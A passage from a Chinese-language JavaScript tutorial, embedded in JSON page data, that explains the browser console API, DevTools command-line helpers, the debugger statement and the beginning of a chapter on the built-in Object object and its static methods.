系统的标准输出<code>stdout</code>和标准错误<code>stderr</code>，可以输出各种信息到控制台，并且还提供了很多有用的辅助方法。</p>\n<p><code>console</code>的常见用途有两个。</p>\n<ul>\n<li>调试程序，显示网页代码运行时的错误信息。</li>\n<li>提供了一个命令行接口，用来与网页代码互动。</li>\n</ul>\n<p><code>console</code>对象的浏览器实现，包含在浏览器自带的开发工具之中。以 Chrome 浏览器的“开发者工具”（Developer Tools）为例，可以使用下面三种方法的打开它。</p>\n<ol>\n<li>按 F12 或者<code>Control + Shift + i</code>（PC）/ <code>Alt + Command + i</code>（Mac）。</li>\n<li>浏览器菜单选择“工具/开发者工具”。</li>\n<li>在一个页面元素上，打开右键菜单，选择其中的“Inspect Element”。</li>\n</ol>\n<p>打开开发者工具以后，顶端有多个面板。</p>\n<ul>\n<li><strong>Elements</strong>：查看网页的 HTML 源码和 CSS 代码。</li>\n<li><strong>Resources</strong>：查看网页加载的各种资源文件（比如代码文件、字体文件 CSS 文件等），以及在硬盘上创建的各种内容（比如本地缓存、Cookie、Local Storage等）。</li>\n<li><strong>Network</strong>：查看网页的 HTTP 通信情况。</li>\n<li><strong>Sources</strong>：查看网页加载的脚本源码。</li>\n<li><strong>Timeline</strong>：查看各种网页行为随时间变化的情况。</li>\n<li><strong>Performance</strong>：查看网页的性能情况，比如 CPU 和内存消耗。</li>\n<li><strong>Console</strong>：用来运行 JavaScript 命令。</li>\n</ul>\n<p>这些面板都有各自的用途，以下只介绍<code>Console</code>面板（又称为控制台）。</p>\n<p><code>Console</code>面板基本上就是一个命令行窗口，你可以在提示符下，键入各种命令。</p>\n\n        <h2>\n            <a href='#console-对象的静态方法' class='header-anchor'>#</a>\n            <span>console 对象的静态方法</span>\n        </h2>\n    <p><code>console</code>对象提供的各种静态方法，用来与控制台窗口互动。</p>\n\n        <h3>\n            <a href='#console.log()，console.info()，console.debug()' class='header-anchor'>#</a>\n            <span>console.log()，console.info()，console.debug()</span>\n        </h3>\n    <p><code>console.log</code>方法用于在控制台输出信息。它可以接受一个或多个参数，将它们连接起来输出。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log(&#039;Hello World&#039;)\n// Hello World\nconsole.log(&#039;a&#039;, &#039;b&#039;, &#039;c&#039;)\n// a b c</code></pre><p><code>console.log</code>方法会自动在每次输出的结尾，添加换行符。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log(1);\nconsole.log(2);\nconsole.log(3);\n// 1\n// 2\n// 3</code></pre><p>如果第一个参数是格式字符串（使用了格式占位符），<code>console.log</code>方法将依次用后面的参数替换占位符，然后再进行输出。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log(&#039; %s + %s = %s&#039;, 1, 1, 2)\n//  1 + 1 = 2</code></pre><p>上面代码中，<code>console.log</code>方法的第一个参数有三个占位符（<code>%s</code>），第二、三、四个参数会在显示时，依次替换掉这个三个占位符。</p>\n<p><code>console.log</code>方法支持以下占位符，不同类型的数据必须使用对应的占位符。</p>\n<ul>\n<li><code>%s</code> 字符串</li>\n<li><code>%d</code> 整数</li>\n<li><code>%i</code> 整数</li>\n<li><code>%f</code> 浮点数</li>\n<li><code>%o</code> 对象的链接</li>\n<li><code>%c</code> CSS 格式字符串</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>var number = 11 * 9;\nvar color = &#039;red&#039;;\n\nconsole.log(&#039;%d %s balloons&#039;, number, color);\n// 99 red balloons</code></pre><p>上面代码中，第二个参数是数值，对应的占位符是<code>%d</code>，第三个参数是字符串，对应的占位符是<code>%s</code>。</p>\n<p>使用<code>%c</code>占位符时，对应的参数必须是 CSS 代码，用来对输出内容进行CSS渲染。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log(\n  &#039;%cThis text is styled!&#039;,\n  &#039;color: red; background: yellow; font-size: 24px;&#039;\n)</code></pre><p>上面代码运行后，输出的内容将显示为黄底红字。</p>\n<p><code>console.log</code>方法的两种参数格式，可以结合在一起使用。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log(&#039; %s + %s &#039;, 1, 1, &#039;= 2&#039;)\n// 1 + 1  = 2</code></pre><p>如果参数是一个对象，<code>console.log</code>会显示该对象的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log({foo: &#039;bar&#039;})\n// Object {foo: &quot;bar&quot;}\nconsole.log(Date)\n// function Date() { [native code] }</code></pre><p>上面代码输出<code>Date</code>对象的值，结果为一个构造函数。</p>\n<p><code>console.info</code>是<code>console.log</code>方法的别名，用法完全一样。只不过<code>console.info</code>方法会在输出信息的前面，加上一个蓝色图标。</p>\n<p><code>console.debug</code>方法与<code>console.log</code>方法类似，会在控制台输出调试信息。但是，默认情况下，<code>console.debug</code>输出的信息不会显示，只有在打开显示级别在<code>verbose</code>的情况下，才会显示。</p>\n<p><code>console</code>对象的所有方法，都可以被覆盖。因此，可以按照自己的需要，定义<code>console.log</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>[&#039;log&#039;, &#039;info&#039;, &#039;warn&#039;, &#039;error&#039;].forEach(function(method) {\n  console[method] = console[method].bind(\n    console,\n    new Date().toISOString()\n  );\n});\n\nconsole.log(&quot;出错了！&quot;);\n// 2014-05-18T09:00.000Z 出错了！</code></pre><p>上面代码表示，使用自定义的<code>console.log</code>方法，可以在显示结果添加当前时间。</p>\n\n        <h3>\n            <a href='#console.warn()，console.error()' class='header-anchor'>#</a>\n            <span>console.warn()，console.error()</span>\n        </h3>\n    <p><code>warn</code>方法和<code>error</code>方法也是在控制台输出信息，它们与<code>log</code>方法的不同之处在于，<code>warn</code>方法输出信息时，在最前面加一个黄色三角，表示警告；<code>error</code>方法输出信息时，在最前面加一个红色的叉，表示出错。同时，还会高亮显示输出文字和错误发生的堆栈。其他方面都一样。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.error(&#039;Error: %s (%i)&#039;, &#039;Server is not responding&#039;, 500)\n// Error: Server is not responding (500)\nconsole.warn(&#039;Warning! Too few nodes (%d)&#039;, document.childNodes.length)\n// Warning! Too few nodes (1)</code></pre><p>可以这样理解，<code>log</code>方法是写入标准输出（<code>stdout</code>），<code>warn</code>方法和<code>error</code>方法是写入标准错误（<code>stderr</code>）。</p>\n\n        <h3>\n            <a href='#console.table()' class='header-anchor'>#</a>\n            <span>console.table()</span>\n        </h3>\n    <p>对于某些复合类型的数据，<code>console.table</code>方法可以将其转为表格显示。</p>\n<pre class=\"prettyprint language-javascript\"><code>var languages = [\n  { name: &quot;JavaScript&quot;, fileExtension: &quot;.js&quot; },\n  { name: &quot;TypeScript&quot;, fileExtension: &quot;.ts&quot; },\n  { name: &quot;CoffeeScript&quot;, fileExtension: &quot;.coffee&quot; }\n];\n\nconsole.table(languages);</code></pre><p>上面代码的<code>language</code>变量，转为表格显示如下。</p>\n<table>\n<thead>\n<tr>\n<th>(index)</th>\n<th>name</th>\n<th>fileExtension</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>0</td>\n<td>&quot;JavaScript&quot;</td>\n<td>&quot;.js&quot;</td>\n</tr>\n<tr>\n<td>1</td>\n<td>&quot;TypeScript&quot;</td>\n<td>&quot;.ts&quot;</td>\n</tr>\n<tr>\n<td>2</td>\n<td>&quot;CoffeeScript&quot;</td>\n<td>&quot;.coffee&quot;</td>\n</tr>\n</tbody></table>\n<p>下面是显示表格内容的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var languages = {\n  csharp: { name: &quot;C#&quot;, paradigm: &quot;object-oriented&quot; },\n  fsharp: { name: &quot;F#&quot;, paradigm: &quot;functional&quot; }\n};\n\nconsole.table(languages);</code></pre><p>上面代码的<code>language</code>，转为表格显示如下。</p>\n<table>\n<thead>\n<tr>\n<th>(index)</th>\n<th>name</th>\n<th>paradigm</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>csharp</td>\n<td>&quot;C#&quot;</td>\n<td>&quot;object-oriented&quot;</td>\n</tr>\n<tr>\n<td>fsharp</td>\n<td>&quot;F#&quot;</td>\n<td>&quot;functional&quot;</td>\n</tr>\n</tbody></table>\n\n        <h3>\n            <a href='#console.count()' class='header-anchor'>#</a>\n            <span>console.count()</span>\n        </h3>\n    <p><code>count</code>方法用于计数，输出它被调用了多少次。</p>\n<pre class=\"prettyprint language-javascript\"><code>function greet(user) {\n  console.count();\n  return &#039;hi &#039; + user;\n}\n\ngreet(&#039;bob&#039;)\n//  : 1\n// &quot;hi bob&quot;\n\ngreet(&#039;alice&#039;)\n//  : 2\n// &quot;hi alice&quot;\n\ngreet(&#039;bob&#039;)\n//  : 3\n// &quot;hi bob&quot;</code></pre><p>上面代码每次调用<code>greet</code>函数，内部的<code>console.count</code>方法就输出执行次数。</p>\n<p>该方法可以接受一个字符串作为参数，作为标签，对执行次数进行分类。</p>\n<pre class=\"prettyprint language-javascript\"><code>function greet(user) {\n  console.count(user);\n  return &quot;hi &quot; + user;\n}\n\ngreet(&#039;bob&#039;)\n// bob: 1\n// &quot;hi bob&quot;\n\ngreet(&#039;alice&#039;)\n// alice: 1\n// &quot;hi alice&quot;\n\ngreet(&#039;bob&#039;)\n// bob: 2\n// &quot;hi bob&quot;</code></pre><p>上面代码根据参数的不同，显示<code>bob</code>执行了两次，<code>alice</code>执行了一次。</p>\n\n        <h3>\n            <a href='#console.dir()，console.dirxml()' class='header-anchor'>#</a>\n            <span>console.dir()，console.dirxml()</span>\n        </h3>\n    <p><code>dir</code>方法用来对一个对象进行检查（inspect），并以易于阅读和打印的格式显示。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log({f1: &#039;foo&#039;, f2: &#039;bar&#039;})\n// Object {f1: &quot;foo&quot;, f2: &quot;bar&quot;}\n\nconsole.dir({f1: &#039;foo&#039;, f2: &#039;bar&#039;})\n// Object\n//   f1: &quot;foo&quot;\n//   f2: &quot;bar&quot;\n//   __proto__: Object</code></pre><p>上面代码显示<code>dir</code>方法的输出结果，比<code>log</code>方法更易读，信息也更丰富。</p>\n<p>该方法对于输出 DOM 对象非常有用，因为会显示 DOM 对象的所有属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.dir(document.body)</code></pre><p>Node 环境之中，还可以指定以代码高亮的形式输出。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.dir(obj, {colors: true})</code></pre><p><code>dirxml</code>方法主要用于以目录树的形式，显示 DOM 节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.dirxml(document.body)</code></pre><p>如果参数不是 DOM 节点，而是普通的 JavaScript 对象，<code>console.dirxml</code>等同于<code>console.dir</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.dirxml([1, 2, 3])\n// 等同于\nconsole.dir([1, 2, 3])</code></pre>\n        <h3>\n            <a href='#console.assert()' class='header-anchor'>#</a>\n            <span>console.assert()</span>\n        </h3>\n    <p><code>console.assert</code>方法主要用于程序运行过程中，进行条件判断，如果不满足条件，就显示一个错误，但不会中断程序执行。这样就相当于提示用户，内部状态不正确。</p>\n<p>它接受两个参数，第一个参数是表达式，第二个参数是字符串。只有当第一个参数为<code>false</code>，才会提示有错误，在控制台输出第二个参数，否则不会有任何结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.assert(false, &#039;判断条件不成立&#039;)\n// Assertion failed: 判断条件不成立\n\n// 相当于\ntry {\n  if (false) {\n    throw new Error(&#039;判断条件不成立&#039;);\n  }\n} catch(e) {\n  console.error(e);\n}</code></pre><p>下面是一个例子，判断子节点的个数是否大于等于500。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.assert(list.childNodes.length &lt; 500, &#039;节点个数大于等于500&#039;)</code></pre><p>上面代码中，如果符合条件的节点小于500个，不会有任何输出；只有大于等于500时，才会在控制台提示错误，并且显示指定文本。</p>\n\n        <h3>\n            <a href='#console.time()，console.timeEnd()' class='header-anchor'>#</a>\n            <span>console.time()，console.timeEnd()</span>\n        </h3>\n    <p>这两个方法用于计时，可以算出一个操作所花费的准确时间。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.time(&#039;Array initialize&#039;);\n\nvar array= new Array(1000000);\nfor (var i = array.length - 1; i &gt;= 0; i--) {\n  array[i] = new Object();\n};\n\nconsole.timeEnd(&#039;Array initialize&#039;);\n// Array initialize: 1914.481ms</code></pre><p><code>time</code>方法表示计时开始，<code>timeEnd</code>方法表示计时结束。它们的参数是计时器的名称。调用<code>timeEnd</code>方法之后，控制台会显示“计时器名称: 所耗费的时间”。</p>\n\n        <h3>\n            <a href='#console.group()，console.groupEnd()，console.groupCollapsed()' class='header-anchor'>#</a>\n            <span>console.group()，console.groupEnd()，console.groupCollapsed()</span>\n        </h3>\n    <p><code>console.group</code>和<code>console.groupEnd</code>这两个方法用于将显示的信息分组。它只在输出大量信息时有用，分在一组的信息，可以用鼠标折叠/展开。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.group(&#039;一级分组&#039;);\nconsole.log(&#039;一级分组的内容&#039;);\n\nconsole.group(&#039;二级分组&#039;);\nconsole.log(&#039;二级分组的内容&#039;);\n\nconsole.groupEnd(); // 一级分组结束\nconsole.groupEnd(); // 二级分组结束</code></pre><p>上面代码会将“二级分组”显示在“一级分组”内部，并且“一级分组”和“二级分组”前面都有一个折叠符号，可以用来折叠本级的内容。</p>\n<p><code>console.groupCollapsed</code>方法与<code>console.group</code>方法很类似，唯一的区别是该组的内容，在第一次显示时是收起的（collapsed），而不是展开的。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.groupCollapsed(&#039;Fetching Data&#039;);\n\nconsole.log(&#039;Request Sent&#039;);\nconsole.error(&#039;Error: Server not responding (500)&#039;);\n\nconsole.groupEnd();</code></pre><p>上面代码只显示一行”Fetching Data“，点击后才会展开，显示其中包含的两行。</p>\n\n        <h3>\n            <a href='#console.trace()，console.clear()' class='header-anchor'>#</a>\n            <span>console.trace()，console.clear()</span>\n        </h3>\n    <p><code>console.trace</code>方法显示当前执行的代码在堆栈中的调用路径。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.trace()\n// console.trace()\n//   (anonymous function)\n//   InjectedScript._evaluateOn\n//   InjectedScript._evaluateAndWrap\n//   InjectedScript.evaluate</code></pre><p><code>console.clear</code>方法用于清除当前控制台的所有输出，将光标回置到第一行。如果用户选中了控制台的“Preserve log”选项，<code>console.clear</code>方法将不起作用。</p>\n\n        <h2>\n            <a href='#控制台命令行-API' class='header-anchor'>#</a>\n            <span>控制台命令行 API</span>\n        </h2>\n    <p>浏览器控制台中，除了使用<code>console</code>对象，还可以使用一些控制台自带的命令行方法。</p>\n<p>（1）<code>$_</code></p>\n<p><code>$_</code>属性返回上一个表达式的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>2 + 2\n// 4\n$_\n// 4</code></pre><p>（2）<code>$0</code> - <code>$4</code></p>\n<p>控制台保存了最近5个在 Elements 面板选中的 DOM 元素，<code>$0</code>代表倒数第一个（最近一个），<code>$1</code>代表倒数第二个，以此类推直到<code>$4</code>。</p>\n<p>（3）<code>$(selector)</code></p>\n<p><code>$(selector)</code>返回第一个匹配的元素，等同于<code>document.querySelector()</code>。注意，如果页面脚本对<code>$</code>有定义，则会覆盖原始的定义。比如，页面里面有 jQuery，控制台执行<code>$(selector)</code>就会采用 jQuery 的实现，返回一个数组。</p>\n<p>（4）<code>$(selector)</code></p>\n<p><code>$(selector)</code>返回选中的 DOM 对象，等同于<code>document.querySelectorAll</code>。</p>\n<p>（5）<code>$x(path)</code></p>\n<p><code>$x(path)</code>方法返回一个数组，包含匹配特定 XPath 表达式的所有 DOM 元素。</p>\n<pre class=\"prettyprint language-javascript\"><code>$x(&quot;//p[a]&quot;)</code></pre><p>上面代码返回所有包含<code>a</code>元素的<code>p</code>元素。</p>\n<p>（6）<code>inspect(object)</code></p>\n<p><code>inspect(object)</code>方法打开相关面板，并选中相应的元素，显示它的细节。DOM 元素在<code>Elements</code>面板中显示，比如<code>inspect(document)</code>会在 Elements 面板显示<code>document</code>元素。JavaScript 对象在控制台面板<code>Profiles</code>面板中显示，比如<code>inspect(window)</code>。</p>\n<p>（7）<code>getEventListeners(object)</code></p>\n<p><code>getEventListeners(object)</code>方法返回一个对象，该对象的成员为<code>object</code>登记了回调函数的各种事件（比如<code>click</code>或<code>keydown</code>），每个事件对应一个数组，数组的成员为该事件的回调函数。</p>\n<p>（8）<code>keys(object)</code>，<code>values(object)</code></p>\n<p><code>keys(object)</code>方法返回一个数组，包含<code>object</code>的所有键名。</p>\n<p><code>values(object)</code>方法返回一个数组，包含<code>object</code>的所有键值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o = {&#039;p1&#039;: &#039;a&#039;, &#039;p2&#039;: &#039;b&#039;};\n\nkeys(o)\n// [&quot;p1&quot;, &quot;p2&quot;]\nvalues(o)\n// [&quot;a&quot;, &quot;b&quot;]</code></pre><p>（9）<code>monitorEvents(object[, events]) ，unmonitorEvents(object[, events])</code></p>\n<p><code>monitorEvents(object[, events])</code>方法监听特定对象上发生的特定事件。事件发生时，会返回一个<code>Event</code>对象，包含该事件的相关信息。<code>unmonitorEvents</code>方法用于停止监听。</p>\n<pre class=\"prettyprint language-javascript\"><code>monitorEvents(window, &quot;resize&quot;);\nmonitorEvents(window, [&quot;resize&quot;, &quot;scroll&quot;])</code></pre><p>上面代码分别表示单个事件和多个事件的监听方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>monitorEvents($0, &#039;mouse&#039;);\nunmonitorEvents($0, &#039;mousemove&#039;);</code></pre><p>上面代码表示如何停止监听。</p>\n<p><code>monitorEvents</code>允许监听同一大类的事件。所有事件可以分成四个大类。</p>\n<ul>\n<li>mouse：&quot;mousedown&quot;, &quot;mouseup&quot;, &quot;click&quot;, &quot;dblclick&quot;, &quot;mousemove&quot;, &quot;mouseover&quot;, &quot;mouseout&quot;, &quot;mousewheel&quot;</li>\n<li>key：&quot;keydown&quot;, &quot;keyup&quot;, &quot;keypress&quot;, &quot;textInput&quot;</li>\n<li>touch：&quot;touchstart&quot;, &quot;touchmove&quot;, &quot;touchend&quot;, &quot;touchcancel&quot;</li>\n<li>control：&quot;resize&quot;, &quot;scroll&quot;, &quot;zoom&quot;, &quot;focus&quot;, &quot;blur&quot;, &quot;select&quot;, &quot;change&quot;, &quot;submit&quot;, &quot;reset&quot;</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>monitorEvents($(&quot;#msg&quot;), &quot;key&quot;);</code></pre><p>上面代码表示监听所有<code>key</code>大类的事件。</p>\n<p>（10）其他方法</p>\n<p>命令行 API 还提供以下方法。</p>\n<ul>\n<li><code>clear()</code>：清除控制台的历史。</li>\n<li><code>copy(object)</code>：复制特定 DOM 元素到剪贴板。</li>\n<li><code>dir(object)</code>：显示特定对象的所有属性，是<code>console.dir</code>方法的别名。</li>\n<li><code>dirxml(object)</code>：显示特定对象的 XML 形式，是<code>console.dirxml</code>方法的别名。</li>\n</ul>\n\n        <h2>\n            <a href='#debugger-语句' class='header-anchor'>#</a>\n            <span>debugger 语句</span>\n        </h2>\n    <p><code>debugger</code>语句主要用于除错，作用是设置断点。如果有正在运行的除错工具，程序运行到<code>debugger</code>语句时会自动停下。如果没有除错工具，<code>debugger</code>语句不会产生任何结果，JavaScript 引擎自动跳过这一句。</p>\n<p>Chrome 浏览器中，当代码运行到<code>debugger</code>语句时，就会暂停运行，自动打开脚本源码界面。</p>\n<pre class=\"prettyprint language-javascript\"><code>for(var i = 0; i &lt; 5; i++){\n  console.log(i);\n  if (i === 2) debugger;\n}</code></pre><p>上面代码打印出0，1，2以后，就会暂停，自动打开源码界面，等待进一步处理。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Chrome Developer Tools, <a href=\"https://developers.google.com/chrome-developer-tools/docs/console\">Using the Console</a></li>\n<li>Matt West, <a href=\"http://blog.teamtreehouse.com/mastering-developer-tools-console\">Mastering The Developer Tools Console</a></li>\n<li>Firebug Wiki, <a href=\"https://getfirebug.com/wiki/index.php/Console_API\">Console API</a></li>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2013/10/console-api.html\">The JavaScript console API</a></li>\n<li>Marius Schulz, <a href=\"http://blog.mariusschulz.com/2013/11/13/advanced-javascript-debugging-with-consoletable\">Advanced JavaScript Debugging with console.table()</a></li>\n<li>Google Developer, <a href=\"https://developers.google.com/chrome-developer-tools/docs/commandline-api\">Command Line API Reference</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"标准库","link":"javascript:void(0)"},{"title":"Object对象","link":"/stdlib/object.html"}],"content":"\n        <h1>\n            <a href='#Object-对象' class='header-anchor'>#</a>\n            <span>Object 对象</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p>JavaScript 原生提供<code>Object</code>对象（注意起首的<code>O</code>是大写），本章介绍该对象原生的各种方法。</p>\n<p>JavaScript 的所有其他对象都继承自<code>Object</code>对象，即那些对象都是<code>Object</code>的实例。</p>\n<p><code>Object</code>对象的原生方法分成两类：<code>Object</code>本身的方法与<code>Object</code>的实例方法。</p>\n<p><strong>（1）<code>Object</code>对象本身的方法</strong></p>\n<p>所谓”本身的方法“就是直接定义在<code>Object</code>对象的方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>Object.print = function (o) { console.log(o) };</code></pre><p>上面代码中，<code>print</code>方法就是直接定义在<code>Object</code>对象上。</p>\n<p><strong>（2）<code>Object</code>的实例方法</strong></p>\n<p>所谓实例方法就是定义在<code>Object</code>原型对象<code>Object.prototype</code>上的方法。它可以被<code>Object</code>实例直接使用。</p>\n<pre class=\"prettyprint language-javascript\"><code>Object.prototype.print = function () {\n  console.log(this);\n};\n\nvar obj = new Object();\nobj.print() // Object</code></pre><p>上面代码中，<code>Object.prototype</code>定义了一个<code>print</code>方法，然后生成一个<code>Object</code>的实例<code>obj</code>。<code>obj</code>直接继承了<code>Object.prototype</code>的属性和方法，可以直接使用<code>obj.print</code>调用<code>print</code>方法。也就是说，<code>obj</code>对象的<code>print</code>方法实质上就是调用<code>Object.prototype.print</code>方法。</p>\n<p>关于原型对象<code>object.prototype</code>的详细解释，参见《面向对象编程》章节。这里只要知道，凡是定义在<code>Object.prototype</code>对象上面的属性和方法，将被所有实例对象共享就可以了。</p>\n<p>以下先介绍<code>Object</code>作为函数的用法，然后再介绍<code>Object</code>对象的原生方法，分成对象自身的方法（又称为”静态方法“）和实例方法两部分。</p>\n\n        <h2>\n            <a href='#Object()' class='header-anchor'>#</a>\n            <span>Object()</span>\n        </h2>\n    <p><code>Object</code>本身是一个函数，可以当作工具方法使用，将任意值转为对象。这个方法常用于保证某个值一定是对象。</p>\n<p>如果参数为空（或者为<code>undefined</code>和<code>null</code>），<code>Object()</code>返回一个空对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object();\n// 等同于\nvar obj = Object(undefined);\nvar obj = Object(null);\n\nobj instanceof Object // true</code></pre><p>上面代码的含义，是将<code>undefined</code>和<code>null</code>转为对象，结果得到了一个空对象<code>obj</code>。</p>\n<p><code>instanceof</code>运算符用来验证，一个对象是否为指定的构造函数的实例。<code>obj instanceof Object</code>返回<code>true</code>，就表示<code>obj</code>对象是<code>Object</code>的实例。</p>\n<p>如果参数是原始类型的值，<code>Object</code>方法将其转为对应的包装对象的实例（参见《原始类型的包装对象》一章）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object(1);\nobj instanceof Object // true\nobj instanceof Number // true\n\nvar obj = Object(&#039;foo&#039;);\nobj instanceof Object // true\nobj instanceof String // true\n\nvar obj = Object(true);\nobj instanceof Object // true\nobj instanceof Boolean // true</code></pre><p>上面代码中，<code>Object</code>函数的参数是各种原始类型的值，转换成对象就是原始类型值对应的包装对象。</p>\n<p>如果<code>Object</code>方法的参数是一个对象，它总是返回该对象，即不用转换。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [];\nvar obj = Object(arr); // 返回原数组\nobj === arr // true\n\nvar value = {};\nvar obj = Object(value) // 返回原对象\nobj === value // true\n\nvar fn = function () {};\nvar obj = Object(fn); // 返回原函数\nobj === fn // true</code></pre><p>利用这一点，可以写一个判断变量是否为对象的函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function isObject(value) {\n  return value === Object(value);\n}\n\nisObject([]) // true\nisObject(true) // false</code></pre>\n        <h2>\n            <a href='#Object-构造函数' class='header-anchor'>#</a>\n            <span>Object 构造函数</span>\n        </h2>\n    <p><code>Object</code>不仅可以当作工具函数使用，还可以当作构造函数使用，即前面可以使用<code>new</code>命令。</p>\n<p><code>Object</code>构造函数的首要用途，是直接通过它来生成新对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = new Object();</code></pre><blockquote>\n<p>注意，通过<code>var obj = new Object()</code>的写法生成新对象，与字面量的写法<code>var obj = {}</code>是等价的。或者说，后者只是前者的一种简便写法。</p>\n</blockquote>\n<p><code>Object</code>构造函数的用法与工具方法很相似，几乎一模一样。使用时，可以接受一个参数，如果该参数是一个对象，则直接返回这个对象；如果是一个原始类型的值，则返回该值对应的包装对象（详见《包装对象》一章）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o1 = {a: 1};\nvar o2 = new Object(o1);\no1 === o2 // true\n\nvar obj = new Object(123);\nobj instanceof Number // true</code></pre><p>虽然用法相似，但是<code>Object(value)</code>与<code>new Object(value)</code>两者的语义是不同的，<code>Object(value)</code>表示将<code>value</code>转成一个对象，<code>new Object(value)</code>则表示新生成一个对象，它的值是<code>value</code>。</p>\n\n        <h2>\n            <a href='#Object-的静态方法' class='header-anchor'>#</a>\n            <span>Object 的静态方法</span>\n        </h2>\n    <p>所谓“静态方法”，是指部署在<code>Object</code>对象自身的方法。</p>\n\n        <h3>\n            <a href='#Object.keys()，Object.getOwnPropertyNames()' class='header-anchor'>#</a>\n            <span>Object.keys()，Object.getOwnPropertyNames()</span>\n        </h3>\n    <p><code>Object.keys</code>方法和<code>Object.getOwnPropertyNames</code>方法都用来遍历对象的属性。</p>\n<p><code>Object.keys</code>方法的参数是一个对象，返回一个数组。该数组的成员都是该对象自身的（而不是继承的）所有属性名。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p1: 123,\n  p2: 456\n};\n\nObject.keys(obj) // [&quot;p1&quot;, &quot;p2&quot;]</code></pre><p><code>Object.getOwnPropertyNames</code>方法与<code>Object.keys</code>类似，也是接受一个对象作为参数，返回一个数组，包含了该对象自身的所有属性名。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p1: 123,\n  p2: 456\n};\n\nObject.getOwnPropertyNames(obj) // [&quot;p1&quot;, &quot;p2&quot;]</code></pre><p>对于一般的对象来说，<code>Object.keys()</code>和<code>Object.getOwnPropertyNames()</code>返回的结果是一样的。只有涉及不可枚举属性时，才会有不一样的结果。<code>Object.keys</code>方法只返回可枚举的属性（详见《对象属性的描述对象》一章），<code>Object.getOwnPropertyNames</code>方法还返回不可枚举的属性名。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;Hello&#039;, &#039;World&#039;];\n\nObject.keys(a) // [&quot;0&quot;, &quot;1&quot;]\nObject.getOwnPropertyNames(a) // [&quot;0&quot;, &quot;1&quot;, &quot;length&quot;]</code></pre><p>上面代码中，数组的<code>length</code>属性是不可枚举的属性，所以只出现在<code>Object.getOwnPropertyNames</code>方法的返回结果中。</p>\n<p>由于 JavaScript 没有提供计算对象属性个数的方法，所以可以用这两个方法代替。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p1: 123,\n  p2: 456\n};\n\nObject.keys(obj).length // 2\nObject.getOwnPropertyNames(obj).length // 2</code></pre><p>一般情况下，几乎总是使用<code>Object.keys</code>方法，遍历数组的属性。</p>\n\n        <h3>\n            <a href='#其他方法' class='header-anchor'>#</a>\n            <span>其他方法</span>\n        </h3>\n    <p>除了上面提到的两个方法，<code>Object</code>还有不少其他静态方法，将在后文逐一详细介绍。</p>\n<p><strong>（1）对象属性模型的相关方法</strong></p>\n<ul>\n<li><code>Object.getOwnPropertyDescriptor()</code>：获取某个属性的描述对象。</li>\n<li><code>Object.defineProperty()</code>：通过描述对象，定义某个属性。</li>\n<li><code>Object.defineProperties()</code>：通过描述对象，定义多个属性。</li>\n</ul>\n<p><strong>（2）控制对象状态的方法</strong></p>\n<ul>\n<li><code>Object.preventExtensions()</code>：防止对象扩展。</li>\n<li><code>Object.isExtensible()</code>：判断对象是否可扩展。</li>\n<li><code>Object.seal()</code>：禁止对象配置。</li>\n<li><code>Object.isSealed()</code>：判断一个对象是否可配置。</li>\n<li><code>Object.freeze()</code>：冻结一个对象。</li>\n<li><code>Object.isFrozen()</code>：判断一个对象是否被冻结。</li>\n</ul>\n<p><strong>（3）原型链相关方法</strong></p>\n<ul>\n<li><code>Object.create()</code>：该方法可以指定原型对象和属性，返回一个新的对象。</li>\n<li><code>Object.getPrototypeOf()</code>：获取对象的<code>Prototype</code>对象。</li>\n</ul>\n\n        <h2>\n            <a href='#Object-的实例方法' class='header-anchor'>#</a>\n            <span>Object 的实例方法</span>\n        </h2>\n    